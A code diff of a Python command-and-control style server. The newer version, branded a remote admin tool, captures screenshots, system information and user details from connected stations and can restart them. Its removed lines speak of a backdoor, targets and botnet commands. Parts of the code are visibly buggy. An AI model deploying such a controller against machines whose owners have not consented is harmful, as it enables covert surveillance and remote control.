@@ -1,272 +1,205 @@
+from datetime import datetime
+from termcolor import colored
+from threading import Thread
+from colorama import init
+import subprocess
+import threading
+import argparse
+import pwinput
 import os.path
 import ntpath
 import select
-
-from colorama import init
-from termcolor import colored
-import subprocess
-import threading
-from threading import Thread
-from datetime import datetime
 import random
 import socket
+import psutil
 import time
-from PIL import ImageGrab, Image
+import sys
 
 init()
 
 
-class Client(Thread):
-    def __init__(self, ip, port, clients):
-        Thread.__init__(self, name=f"{ip} | {port}")
-        self.ip = ip
-        self.port = port
+class Client:
+    def __init__(self, clients):
         self.clients = clients
         self.d = datetime.now().replace(microsecond=0)
         self.dt = str(self.d.strftime("%b %d %Y | %I-%M-%S"))
-        self.port = 55400
-        self.stop_threads = False
-        self.stop_pulse = threading.Event()
-        self.stop_pulse.set()
-        self.stop_poke = threading.Event()
-        self.stop_poke.set()
-        self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
-                              rf"{self.ip} {str(self.ip)} {self.dt}.txt"
 
-        welcome = "Connection Established!"
-        conn.send(f"@Server: {welcome}".encode())
-        if conn not in targets:
-            targets.append(conn)
-            ips.append(self.ip)
-            connections[conn] = self.ip
-
-            sconnections[conn, self.ip] = self.d
-            clients += 1
-            cmd.server()
-
-    def shell(self):
-        commands = ['screenshot', 'anydesk', 'system info', 'restart', 'cmd', 'q', 'exit']
-        show_shell_commands()
-
+    def shell(self, conn, ip, clients):
+        errCount = 0
         while True:
-            cmd = input(f"@{ip}: ")
-            if str(cmd).lower() == "q":
-                break
+            try:
+                show_shell_commands()
+                # Wait for User Input
+                cmd = input(f"{ip} > ")
 
-            elif str(cmd).lower() == 'screenshot' or int(cmd) == 1:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                chunk = 1000000
-                print(f"working...")
-                conn.send('screen'.encode())
-                filenameRecv = conn.recv(1024)
-                conn.send("OK filename".encode())
-                name = ntpath.basename(str(filenameRecv))
-                print(name)
-                with open(filenameRecv, 'wb') as file:
-                    try:
-                        fileRecv = conn.recv(chunk)
-                        file.write(fileRecv)
+                # Input Validation
+                try:
+                    val = float(cmd)
+                    if int(cmd) <= 0 or int(cmd) > 7:
+                        errCount += 1
+                        if errCount == 3:
+                            print("U obviously don't know what you're doing. goodbye.")
+                            conn.send("exit".encode())
+                            conn.shutdown(socket.SHUT_RDWR)
+                            conn.close()
+                            sys.exit()
 
-                    except len(fileRecv) == 0:
+                        print(f"[{colored('*', 'red')}]{cmd} not in the menu."
+                              f"[try {colored(errCount, 'yellow')} of {colored('3', 'yellow')}]\n")
+
+                        continue
+
+                except Exception:
+                    errCount += 1
+                    if errCount == 3:
+                        print("U obviously don't know what you're doing. goodbye.")
+                        conn.send("exit".encode())
+                        conn.shutdown(socket.SHUT_RDWR)
+                        conn.close()
+                        sys.exit()
+
+                    print(f"[{colored('*', 'red')}]The system only accepts numbers."
+                          f"[try #: {colored(errCount, 'yellow')} of {colored('3', 'yellow')}]\n")
+
+                    continue
+
+                # Screenshot
+                if int(cmd) == 1:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
                         break
 
-                # print(f"[{colored('*', 'green')}]Received: {name[:-2]} \n")
-                conn.send(f"Received file: {name[:-1]}\n".encode())
-                msg = conn.recv(1024).decode()
-                print(f"{msg}")
-                continue
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    chunk = 1000000
+                    print(f"working...")
+                    conn.send('screen'.encode())
+                    filenameRecv = conn.recv(1024)
+                    conn.send("OK filename".encode())
+                    name = ntpath.basename(str(filenameRecv))
+                    print(name)
+                    with open(filenameRecv, 'wb') as file:
+                        try:
+                            fileRecv = conn.recv(chunk)
+                            file.write(fileRecv)
 
-            elif str(cmd).lower() == 'anydesk' or int(cmd) == 2:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                conn.send('anydesk'.encode())
-                msg = conn.recv(1024).decode()
-                print(f"{msg}")
-                continue
+                        except len(fileRecv) == 0:
+                            return
 
-            elif str(cmd.lower()) == 'system info' or int(cmd) == 3:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                print(f"working...")
-                conn.send('bt'.encode())
-                filenameRecv = conn.recv(1024)
-                time.sleep(10)
-                fileRecv = conn.recv(4096).decode()
-                print(fileRecv)
-                newFile = fr"{fileRecv}"
-
-                with open(filenameRecv, 'w') as file:
-                    file.write(fileRecv)
-
-                name = ntpath.basename(str(filenameRecv))
-                print(f"[{colored('*', 'green')}]Received: {name[:-2]} \n")
-                conn.send(f"Received file: {name[:-1]}\n".encode())
-                continue
-
-            elif str(cmd).lower() == "restart" or int(cmd) == 4:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                sure = input("Are you sure you want to restart [Y/n]?")
-                while True:
-                    try:
-                        if str(sure).lower() == "y":
-                            conn.send('restart'.encode())
-                            break
-
-                        elif str(sure).lower() == "n":
-                            break
-
-                    except TypeError:
-                        print("Wrong Input")
-
-                continue
-
-            elif str(cmd).lower() == 'cmd' or int(cmd) == 5:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                conn.send(cmd.encode())
-                continue
-
-            elif str(cmd).lower() == "q" or int(cmd) == 6:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                conn.send(cmd.encode())
-                break
-
-            elif str(cmd) == "disconnect" or int(cmd) == 7:
-                d = datetime.now().replace(microsecond=0)
-                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
-                conn.send(cmd.encode())
-                conn.shutdown(socket.SHUT_RDWR)
-                conn.close()
-                targets.remove(conn)
-                ips.remove(ip)
-                break
-
-            else:
-                if str(cmd).lower() not in commands or int(cmd) < 0 or int(cmd) > 7:
-                    print(f"Wrong Command: '{cmd}'")
+                    # print(f"[{colored('*', 'green')}]Received: {name[:-2]} \n")
+                    conn.send(f"Received file: {name[:-1]}\n".encode())
+                    msg = conn.recv(1024).decode()
+                    print(f"{msg}")
                     continue
+
+                # System Information
+                elif int(cmd) == 2:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
+                        break
+
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    print(f"working...")
+                    conn.send('si'.encode())
+                    filenameRecv = conn.recv(1024)
+                    time.sleep(10)
+                    fileRecv = conn.recv(4096).decode()
+                    print(fileRecv)
+
+                    with open(filenameRecv, 'w') as file:
+                        file.write(fileRecv)
+
+                    name = ntpath.basename(str(filenameRecv))
+                    print(f"[{colored('*', 'green')}]Received: {name} \n")
+                    conn.send(f"Received file: {name}\n".encode())
+                    msg = conn.recv(1024).decode()
+                    print(f"{msg}")
+
+                    continue
+
+                # Show Current Logged On User
+                elif int(cmd) == 3:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
+                        break
+
+                    conn.send('user'.encode())
+                    msg = conn.recv(1024)
+                    print(msg.decode())
+                    continue
+
+                # Last Restart Time
+                elif int(cmd) == 4:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
+                        break
+
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    conn.send('lr'.encode())
+                    msg = conn.recv(1024)
+                    print(msg.decode())
+
+                    continue
+
+                # Anydesk
+                elif int(cmd) == 5:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
+                        break
+
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    conn.send('anydesk'.encode())
+                    continue
+
+                # Restart
+                elif int(cmd) == 6:
+                    if len(targets) == 0:
+                        print(f"[{colored('*', 'red')}]No connected stations.")
+                        break
+
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    sure = input("Are you sure you want to restart [Y/n]?")
+                    while True:
+                        try:
+                            if str(sure).lower() == "y":
+                                conn.send('restart'.encode())
+                                targets.remove(conn)
+                                ips.remove(ip)
+                                clients -= 1
+                                break
+
+                            elif str(sure).lower() == "n":
+                                break
+
+                        except TypeError:
+                            print("Wrong Input")
+                    return
+
+                # Back
+                elif int(cmd) == 7:
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+                    conn.send('exit'.encode())
+                    targets.remove(conn)
+                    ips.remove(ip)
+                    self.clients -= 1
+                    break
+
+            except (ConnectionResetError, ConnectionError, ConnectionAbortedError):
+                print(f"[{colored('*', 'red')}]Connection Interrupted.\n")
+                targets.remove(ip)
+                ips.remove(ip)
+                clients -= 1
+                return
+
+            return
 
 
 class Command:
-    def server(self):
-        while True:
-            welcome_menu()
-            command = input("*CONTROL*->>$ ")
-            if command == "help":
-                print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Command Center', 'red')} <=",
-                      f"{colored('=', 'blue')}" * 20)
-                print(f"\t\t[{colored('*', 'cyan')}]pulse                ----> "
-                      f"Check ping to connected machines.")
-                print(f"\t\t[{colored('*', 'cyan')}]ps                   ----> "
-                      f"Pause Pulse Check.")
-                print(f"\t\t[{colored('*', 'cyan')}]np                   ----> "
-                      f"Show targets with dead pulse check.")
-                print(f"\t\t[{colored('*', 'cyan')}]poke                 ----> "
-                      f"Check if Backdoor is running.")
-
-                print(f"\t\t[{colored('*', 'cyan')}]rsession #           ----> "
-                      f"Remove session from target list.")
-                print(f"\t\t[{colored('*', 'cyan')}]asession #           ----> "
-                      f"Add session to targets list.")
-                print(f"\t\t[{colored('*', 'cyan')}]connhist             ----> "
-                      f"Show connections history.")
-                print(f"\t\t[{colored('*', 'cyan')}]botnet + command     ----> "
-                      f"Send a command to botnet.\n")
-
-            elif command == "pulse":
-                self.stop_pulse.clear()
-                check_pulse_thread = threading.Thread(target=self.pulse_check,
-                                                      name='Ping thread')
-                check_pulse_thread.start()
-
-            elif command == "ps":
-                self.stop_pulse.set()
-                print(f"[{colored('*', 'blue')}]Pulse check paused.")
-
-            elif command == "np":
-                if len(self.noping_ips) == 0:
-                    print(f"[{colored('*', 'magenta')}]Target list is empty. run 'pulse' command to re-check.")
-
-                count = 0
-                for i in self.noping_ips:
-                    print(f"[{colored(str(count), 'blue')}]: "
-                          f"{colored(i, 'red')}")
-                    count += 1
-                continue
-
-            elif command == "poke":
-                self.stop_poke.clear()
-                poke_thread = threading.Thread(target=self.poke, name='Poke Thread')
-                poke_thread.start()
-
-            elif command == "targets":
-                if len(ips) == 0:
-                    print(colored("[i]No connected targets.", 'magenta'))
-
-                count = 0
-                for ip in ips:
-                    print(f"Session [{str(colored(str(count), 'cyan'))}]: {str(colored(ip, 'green'))}")
-                    count += 1
-
-            elif command[:8] == "session ":
-                num = command[8:]
-                while True:
-                    try:
-                        num = int(command[8:])
-                        if num != 0 and num < len(targets):
-                            print(f"No such session: {num}")
-                            num = ''
-                            raise IndexError
-
-                        tarnum = targets[num]
-                        ipnum = ips[num]
-                        Client.shell(conn)
-
-                    except (ValueError, IndexError):
-                        print("Wrong Session")
-
-                    break
-
-            elif command[:9] == "rsession ":
-                num = int(command[9:])
-                tarnum = self.targets[num]
-                ipnum = self.ips[num]
-                self.targets.remove(tarnum)
-                self.ips.remove(ipnum)
-                print(f"[{colored('+', 'cyan')}]{colored(ipnum, 'yellow')} removed.")
-                continue
-
-            elif command[:9] == "asession ":
-                num = int(command[9:])
-                tarnum = self.noping_targets[num]
-                ipnum = self.noping_ips[num]
-                self.targets.append(tarnum)
-                self.ips.append(ipnum)
-                continue
-
-            elif command == "connhist":
-                c = 1
-                for k, v in self.sconnections.items():
-                    print(
-                        f"[{colored(str(c), 'blue')}]{colored(str(k[1]), 'yellow')} | Time: {colored(v, 'blue')}")
-
-                    c += 1
-
-            elif command[:7] == "botnet ":
-                sendall(command=command)
-
-            elif command == "exit":
-                for t in self.targets:
-                    self.stop_threads = True
-                    t.shutdown(2)
-                    t.close()
-
-            else:
-                continue
-
     def sendall(self, command):
         try:
             for t in self.targets:
@@ -378,71 +311,214 @@ class Command:
 
 
 def welcome_menu():
-    print(f"\n[{colored('*', 'cyan')}]Connection from: IP: {colored(ip, 'green')} | "
-          f"Port: {colored(port, 'green')} | Session: {colored(ips.index(ip), 'green')}")
-    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Command Center', 'red')} <=",
+    try:
+        print(f"\n\t\t[{colored('*', 'green')}]Connection from: IP: {colored(ip, 'green')} | "
+              f"Port: {colored(port, 'green')} | Name: {colored(ident, 'green')}")
+
+    except ValueError:
+        pass
+
+    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Welcome to Mekif Remote Admin!', 'red')} <=",
           f"{colored('=', 'blue')}" * 20)
-    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('By Gil Shwartz', 'red')} <=",
+    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=>      {colored('By Gil Shwartz @2022', 'red')}      <=",
           f"{colored('=', 'blue')}" * 20)
-    print(f"\t\t[{colored('*', 'cyan')}]targets              ----> "
-          f"Show connected machines.")
-    print(f"\t\t[{colored('*', 'cyan')}]session #            ----> "
-          f"Connect to session number. (Example: session 0)\n")
+    print("\t\t" + f"{colored('=', 'yellow')}" * 78 + "\n")
+    print(f"\t\t[{colored('1', 'yellow')}]Remote Control          ---------------> "
+          f"Show Remote Commands")
+    print(f"\t\t[{colored('2', 'yellow')}]Connection History      ---------------> "
+          f"Show connection history.")
+    print(f"\t\t[{colored('3', 'yellow')}]Close                   ---------------> "
+          f"Close current session.")
+    print(f"\t\t[{colored('4', 'yellow')}]Exit                    ---------------> "
+          f"Close connections and exit program.\n")
 
 
 def show_shell_commands():
-    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('SHELL CONTROL', 'red')} <=",
+    print("\t\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('REMOTE CONTROL', 'red')} <=",
           f"{colored('=', 'blue')}" * 20)
-    print(f"\t\t[{colored('1', 'cyan')}]Screenshot      \t\t\t----> "
+    print(f"\t\t[{colored('1', 'cyan')}]Screenshot          \t\t---------------> "
           f"Capture screenshot.")
-    print(f"\t\t[{colored('2', 'cyan')}]Anydesk         \t\t\t----> "
-          f"Start Anydesk")
-    print(f"\t\t[{colored('3', 'cyan')}]System Info     \t\t\t----> "
+    print(f"\t\t[{colored('2', 'cyan')}]System Info         \t\t---------------> "
           f"Show Station's System Information")
-    print(f"\t\t[{colored('4', 'cyan')}]Restart         \t\t\t----> "
+    print(f"\t\t[{colored('3', 'cyan')}]Current User        \t\t---------------> "
+          f"Show current logged on user")
+    print(f"\t\t[{colored('4', 'cyan')}]Last Restart Time   \t\t---------------> "
+          f"Show remote station's last restart time")
+    print(f"\t\t[{colored('5', 'cyan')}]Anydesk             \t\t---------------> "
+          f"Start Anydesk")
+    print(f"\t\t[{colored('6', 'cyan')}]Restart             \t\t---------------> "
           f"Restart remote station")
-    print(f"\t\t[{colored('5', 'cyan')}]cmd             \t\t\t----> "
-          f"Go Back to Control Center (Connection stays alive")
-    print(f"\t\t[{colored('6', 'cyan')}]q               \t\t\t----> "
-          f"Go Back to Control Center (Connection stays alive")
-    print(f"\t\t[{colored('7', 'cyan')}]Disconnect      \t\t\t----> "
-          f"Close Connection and go back to Control Center\n")
+    print(f"\t\t[{colored('7', 'cyan')}]Back                \t\t---------------> "
+          f"Back to Control Center\n")
+
+
+def create_socket(ip):
+    listener = socket.socket()
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listener.bind((ip, port))
+
+    return listener
+
+
+def accept():
+    while True:
+        (conn, (ip, port)) = listener.accept()
+        return conn, (ip, port)
+
+
+def validation(users):
+    phrase = ' '
+    tries = 0
+    while True:
+        validate = pwinput.pwinput(prompt="Enter Password: ", mask='*')
+        if str(validate) == str(phrase):
+            tries = 0
+            return
+
+        else:
+            tries += 1
+            print(f"Wrong password! [{tries} of 3]")
+            if int(tries) >= 3:
+                print("Exiting.")
+                sys.exit()
 
 
 if __name__ == '__main__':
+    users = ['g', 'r', 'o', 'i']
     noping_live_connections = {}
     connections = {}
-    sconnections = {}
+    sconnections = [{}]
     noping_targets = []
     noping_ips = []
     ips = []
     targets = []
     clients = 0
     listeners = []
-    stop_threads = False
     threads = []
     port = 55400
-    cmd = Command()
-    print(f"[{colored('*', 'cyan')}]Listening...")
-    listener = socket.socket()
-    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    listener.bind(('192.168.1.10', port))
+    last_reboot = psutil.boot_time()
+    hostname = socket.gethostname()
+    serverIP = str(socket.gethostbyname(hostname))
+
+    # Run User Validation
+    # validation(users)
+
+    print(f"[{colored('*', 'cyan')}]Starting Server on IP: {serverIP} | Port: {port}")
+    print(f"[{colored('*', 'cyan')}]Server's Last Restart: "
+          f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}\n")
+    print(f"[{colored('*', 'magenta')}]Listening...")
+
+    # Create Sockets
+    listener = create_socket(serverIP)
+    listeners.append(listener)
+    listener.listen(5)
 
     while True:
-        listener.listen(10)
-        read_sockets, write_sockets, error_sockets = select.select([listener], [], [])
-        for sock in read_sockets:
-            if stop_threads:
-                break
+        # Accept New Connections
+        conn, (ip, port) = accept()
 
-            (conn, (ip, port)) = listener.accept()
-            newThread = Client(ip, port, clients)
-            newThread.start()
-            threads.append(newThread)
+        # Capture Date & Time with an AM PM
+        d = datetime.now().replace(microsecond=0)
+        dt = str(d.strftime("%b %d %Y %I:%M:%S %p"))
 
-        cmd.server()
+        # Get Remote Computer's Name
+        ident = conn.recv(1024).decode()
 
-        break
+        # Update Connection Lists
+        if conn not in targets:
+            targets.append(conn)
+            ips.append(ip)
 
-    for t in threads:
-        t.join()
+        connections[conn] = ip
+        temp_connection_record = {f'IP: {ip} | Name: {ident}': dt}
+        sconnections.append(temp_connection_record)
+        clients += 1
+
+        # Initialize Client Class
+        client = Client(clients)
+
+        while True:
+            # Send Welcome Message
+            try:
+                welcome = "Connection Established!"
+                conn.send(f"@Server: {welcome}".encode())
+
+            except (ConnectionResetError, ConnectionError, ConnectionAbortedError):
+                print(
+                    f"[{colored('*', 'red')}]Check client's connection. use the {colored('Close', 'yellow')} option.")
+                if conn in targets:
+                    targets.remove(conn)
+                    ips.remove(ip)
+                    clients -= 1
+
+            welcome_menu()
+
+            # Wait For User Commands
+            command = input(f"CONTROL@{ip}> ")
+            try:
+                # Remote Shell Commands
+                if command.lower() == "shell" or int(command) == 1:
+                    if conn not in targets:
+                        break
+
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y %I:%M:%S %p"))
+                    while True:
+                        if len(targets) > 0:
+                            try:
+                                client.shell(conn, ip, clients)
+                                break
+
+                            except (ValueError, IndexError):
+                                if conn in targets:
+                                    targets.remove(conn)
+
+                                if ip in ips:
+                                    ips.remove(ip)
+
+                        else:
+                            raise ValueError("f[{colored('*', 'red')}]No available stations.")
+
+                # Connection History
+                elif command.lower() == "history" or int(command) == 2:
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y %I:%M:%S %p"))
+                    c = 1
+                    for connection in sconnections:
+                        for k, v in connection.items():
+                            print(
+                                f"[{colored(str(c), 'cyan')}]{k} | {colored('Time', 'cyan')}: {v}")
+                            c += 1
+
+                # Close Current Connection
+                elif command == "close" or int(command) == 3:
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y %I:%M:%S %p"))
+                    if len(targets) > 0:
+                        for t in targets:
+                            t.close()
+
+                        targets.remove(conn)
+                        ips.remove(ip)
+                        clients -= 1
+                        break
+
+                    else:
+                        print(f"[{colored('*', 'magenta')}]Listening...")
+
+                    break
+
+                # Exit Program
+                elif command == "break" or int(command) == 4:
+                    d = datetime.now().replace(microsecond=0)
+                    dt = str(d.strftime("%b %d %Y %I:%M:%S %p"))
+                    conn.shutdown(socket.SHUT_RDWR)
+                    conn.close()
+                    sys.exit()
+
+            except ValueError:
+                print(f"[{colored('*', 'red')}]Check client's connection. use the {colored('Close', 'yellow')} option.")
+                continue
+
+            else:
+                continue
